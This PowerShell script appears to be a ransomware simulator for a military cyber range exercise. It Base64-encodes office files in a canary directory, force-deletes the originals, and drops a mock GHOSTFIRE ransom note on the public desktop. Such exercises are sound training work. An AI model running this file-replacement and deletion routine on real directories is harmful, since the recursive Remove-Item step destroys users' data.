<#
.SYNOPSIS
    APT GHOSTFIRE Controlled Ransomware Simulator (Scenario 5 - Exercise AJEX)
.DESCRIPTION
    Encodes canary files, appends .ghostfire extension, and drops simulated ransom note.
    Safe for production environments: strictly targets designated canary directory.
#>
param (
    [string]$TargetDirectory = "C:\ExerciseShares"
)

Write-Host "==================================================================" -ForegroundColor Yellow
Write-Host " [!] INITIATING APT GHOSTFIRE CONTROLLED RANSOMWARE SIMULATOR" -ForegroundColor Yellow
Write-Host " Target Directory: $TargetDirectory" -ForegroundColor Yellow
Write-Host "==================================================================" -ForegroundColor Yellow

if (!(Test-Path $TargetDirectory)) {
    Write-Host "[*] Creating target canary directory: $TargetDirectory"
    New-Item -ItemType Directory -Path $TargetDirectory -Force | Out-Null
    1..5 | ForEach-Object {
        "CONFIDENTIAL MILITARY OPERATIONAL BRIEFING DATA CANARY $_" | Out-File -FilePath "$TargetDirectory\operation_briefing_$_.docx" -Encoding utf8
    }
}

$files = Get-ChildItem -Path $TargetDirectory -Include *.docx,*.xlsx,*.pdf,*.txt -File -Recurse

if ($files.Count -eq 0) {
    Write-Host "[-] No target files found in $TargetDirectory to simulate encryption!" -ForegroundColor Red
    exit 1
}

foreach ($file in $files) {
    if ($file.Name -eq "GHOSTFIRE_README.txt") { continue }
    Write-Host "[*] Simulating ransomware encryption on: $($file.FullName)" -ForegroundColor Cyan
    $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
    $encoded = [System.Convert]::ToBase64String($bytes)
    
    $newPath = "$($file.FullName).ghostfire"
    [System.IO.File]::WriteAllText($newPath, "--- APT GHOSTFIRE ENCRYPTED ARTIFACT ---`n$encoded")
    Remove-Item -Path $file.FullName -Force
}

$RansomNote = @"
===============================================================================
                       APT GHOSTFIRE EXERCISE RANSOM NOTE
===============================================================================
ATTENTION AFP CYCOM COMMAND:
All critical operational files in this enclave have been encrypted using 
military-grade cryptographic algorithms.

To restore your systems and decrypt your data:
1. Contact APT GHOSTFIRE via Transit Node: 10.100.0.80 (Port 4433)
2. Submit your unique victim token: CYCOM-BT1-NODE1-2026
3. Do not alter or rename .ghostfire files or recovery will be impossible.

THIS IS A CONTROLLED CYBER RANGE EXERCISE SIMULATION.
DO NOT CONTACT EXTERNAL AUTHORITIES.
===============================================================================
"@

Set-Content -Path "$TargetDirectory\GHOSTFIRE_README.txt" -Value $RansomNote -Force
Set-Content -Path "C:\Users\Public\Desktop\GHOSTFIRE_README.txt" -Value $RansomNote -Force -ErrorAction SilentlyContinue

Write-Host "[✓] Ransomware simulation complete. Canary files encrypted with .ghostfire" -ForegroundColor Green
Write-Host "[✓] Ransom note written to: $TargetDirectory\GHOSTFIRE_README.txt" -ForegroundColor Green
